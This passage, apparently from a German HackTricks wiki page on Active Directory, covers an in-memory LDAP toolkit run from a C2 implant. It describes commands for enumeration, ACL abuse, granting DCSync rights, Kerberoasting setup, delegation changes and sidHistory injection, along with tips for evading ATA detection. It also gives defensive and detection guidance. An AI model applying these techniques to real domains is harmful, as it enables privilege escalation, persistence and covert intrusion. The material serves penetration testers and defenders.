Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-style LDAP-Primitives als x64 Beacon Object Files neu, die vollständig innerhalb eines On-Host-Implants (z. B. Adaptix C2) ausgeführt werden. Operatoren kompilieren das Pack mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen anschließend über den Beacon `ldap <subcommand>` auf. Der gesamte Traffic läuft über den aktuellen Logon-Security-Context via LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischem Certificate Trust, sodass weder Socks-Proxies noch Artefakte auf der Festplatte erforderlich sind.<sup>[[4]](#references)</sup>

### LDAP enumeration auf der Implant-Seite

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` und `get-groupmembers` lösen kurze Namen bzw. OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute` und `get-domaininfo` rufen beliebige Attribute, einschließlich Security Descriptors, sowie die Forest-/Domänen-Metadaten aus `rootDSE` ab.
- `get-uac`, `get-spn`, `get-delegation` und `get-rbcd` zeigen Roasting-Kandidaten, Delegation-Einstellungen und vorhandene Deskriptoren für [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direkt aus LDAP an.
- `get-acl` und `get-writable --detailed` analysieren die DACL, um Trustees, Rechte (GenericAll/WriteDACL/WriteOwner/Attributschreibzugriffe) und Vererbung aufzulisten, wodurch unmittelbare Ziele für die ACL privilege escalation sichtbar werden.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-Schreibprimitive für Eskalation und Persistenz

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ermöglichen es dem Operator, neue Principals oder Computerkonten überall dort bereitzustellen, wo OU-Rechte vorhanden sind. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` übernehmen Ziele direkt, sobald Write-property-Rechte gefunden wurden.
- ACL-focused commands wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` wandeln WriteDACL/WriteOwner für beliebige AD-Objekte in Passwortzurücksetzungen, Kontrolle über Gruppenmitgliedschaften oder DCSync-Replikationsrechte um, ohne PowerShell-/ADSI-Artefakte zu hinterlassen. Die Gegenstücke `remove-*` bereinigen injizierte ACEs.

### Delegation, Roasting und Kerberos-Missbrauch

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoastable; `add-asreproastable` (UAC toggle) markiert ihn für AS-REP roasting, ohne das Passwort zu ändern.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) ändern `msDS-AllowedToDelegateTo`, UAC flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` direkt vom Beacon aus. Dadurch werden constrained/unconstrained/RBCD attack paths ermöglicht und die Notwendigkeit für Remote-PowerShell oder RSAT entfällt.

### sidHistory-Injection, OU-Verschiebung und Gestaltung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in die SID history eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)) und ermöglicht dadurch eine unauffällige Zugriffvererbung vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/die OU von Computern oder Benutzern. Dadurch kann ein Angreifer Assets in OUs verschieben, in denen bereits delegierte Rechte vorhanden sind, bevor er `set-password`, `add-groupmember` oder `add-spn` missbraucht.
- Eng begrenzte Removal-Befehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` usw.) ermöglichen ein schnelles Rollback, nachdem der Operator Credentials oder Persistenz erlangt hat, und minimieren so die Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Einige allgemeine Schutzmaßnahmen

[**Erfahre hier mehr darüber, wie du Credentials schützen kannst.**](../stealing-credentials/credentials-protections.md)

### **Schutzmaßnahmen für den Credential-Schutz**

- **Einschränkungen für Domain Admins**: Es wird empfohlen, Domain Admins nur die Anmeldung an Domain Controllers zu erlauben und ihre Verwendung auf anderen Hosts zu vermeiden.
- **Berechtigungen von Service Accounts**: Services sollten aus Sicherheitsgründen nicht mit Domain-Admin-(DA-)Berechtigungen ausgeführt werden.
- **Zeitliche Begrenzung von Berechtigungen**: Bei Aufgaben, die DA-Berechtigungen erfordern, sollte deren Dauer begrenzt werden. Dies kann erreicht werden durch: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP-relay mitigation**: Überwache die Event IDs 2889/3074/3075 und erzwinge anschließend LDAP signing sowie LDAPS channel binding auf DCs/Clients, um LDAP-MITM-/Relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokollbasierte Erkennung von Impacket-Aktivität

Wenn du gängige AD tradecraft erkennen möchtest, **verlasse dich nicht ausschließlich auf vom Operator kontrollierte Artefakte**, etwa umbenannte Binaries, Servicenamen, temporäre Batch-Dateien oder Output-Pfade. Ermittle zunächst, wie legitime Windows-Clients [Kerberos](kerberos-authentication.md)-, [NTLM](../ntlm/README.md)-, SMB-, LDAP-, DCE/RPC- und WMI-Datenverkehr erzeugen, und suche anschließend nach **Implementierungsbesonderheiten**, die auch bestehen bleiben, nachdem der Operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` oder `ntlmrelayx.py` bearbeitet hat.<sup>[[8]](#references)</sup>

- **Kandidaten mit hoher eigenständiger Aussagekraft** (nach Abgleich mit deiner eigenen Baseline):
- Authenticated DCE/RPC mit `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding, das mit `0xff` gefüllt ist
- LDAP Kerberos binds, die einen rohen Kerberos-`AP-REQ` direkt in `mechToken` von SPNEGO platzieren
- SMB2/3 negotiate requests mit ASCII-ähnlichen `ClientGuid`-Werten
- WMI `IWbemLevel1Login::NTLMLogin` unter Verwendung des nicht standardmäßigen Namespace `//./root/cimv2`
- Hardcodierte Kerberos nonce-Werte
- **Besser als Korrelations-/Scoring-Merkmale geeignet**:
- Spärliche oder duplizierte Kerberos-etype-Listen, ungewöhnliche oder fehlende `PA-DATA` oder eine TGS-REQ-etype-Reihenfolge, die von nativem Windows abweicht
- NTLM Type-1-Nachrichten ohne Versionsinformationen oder Type-3-Nachrichten mit null host names
- Rohes NTLMSSP in DCE/RPC statt SPNEGO, fehlende DCE/RPC verification trailers oder nicht übereinstimmende SPNEGO-/Kerberos-OIDs
- Mehrere dieser Merkmale vom selben Host/User/in derselben Session bzw. demselben Zeitfenster sind deutlich aussagekräftiger als jedes einzelne schwache Feld
- **Als Enrichment verwenden, nicht als eigenständige Alerts**:
- Standarddateinamen, Output-Pfade, zufällige Servicenamen, temporäre Batch-Namen, Standardnamen von Computerkonten sowie tool-spezifische HTTP-/WebDAV-/RDP-/MSSQL-Strings
- Diese lassen sich von Operatoren leicht ändern und sollten am besten dazu verwendet werden, zu erklären, warum ein protokollübergreifender Cluster verdächtig ist
- **Betriebliche Hinweise**:
- Einige dieser Signale erfordern entschlüsselten Datenverkehr, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW oder Visibility auf der Serviceseite
- Gleiche die Ergebnisse mit Samba-/Linux-Clients, Appliances und Legacy-Software ab, bevor du sie zu Alerts hochstufst
- Stufe Detections von Enrichment -> Hunting -> Alerting hoch, sobald du mehr Vertrauen in die Baseline gewinnst

### **Implementierung von Deception-Techniken**

- Die Implementierung von Deception umfasst das Aufstellen von Fallen, etwa Decoy-Benutzern oder -Computern, mit Eigenschaften wie Passwörtern, die nicht ablaufen, oder der Markierung als Trusted for Delegation. Ein detaillierter Ansatz umfasst das Erstellen von Benutzern mit spezifischen Rechten oder deren Hinzufügen zu Gruppen mit hohen Privilegien.<sup>[[2]](#references)</sup>
- Ein praktisches Beispiel ist die Verwendung von Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mehr über die Bereitstellung von Deception-Techniken findest du unter [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Erkennung von Deception**

- **Für User Objects**: Zu den verdächtigen Indikatoren gehören eine untypische ObjectSID, seltene Logons, Erstellungsdaten und eine geringe Anzahl fehlgeschlagener Passwörter.
- **Allgemeine Indikatoren**: Der Vergleich der Attribute potenzieller Decoy-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können bei der Erkennung solcher Deceptions helfen.

### **Umgehung von Detection-Systemen**

- **Umgehung der Microsoft-ATA-Erkennung**:
- **User Enumeration**: Vermeide die Session-Enumeration auf Domain Controllers, um eine ATA-Erkennung zu verhindern.
- **Ticket Impersonation**: Die Verwendung von **aes**-Keys zur Ticketerstellung hilft, die Erkennung zu umgehen, da kein Downgrade auf NTLM erfolgt.
- **DCSync-Angriffe**: Es wird empfohlen, diese von einem Nicht-Domain-Controller auszuführen, um eine ATA-Erkennung zu vermeiden, da eine direkte Ausführung von einem Domain Controller Alerts auslöst.

## Referenzen

- [1] [A Guide to Attacking Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forging Trusts for Deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [From Domain Admin to Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [A journey into forgotten Null Session and MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

{{#include ../../banners/hacktricks-training.md}}
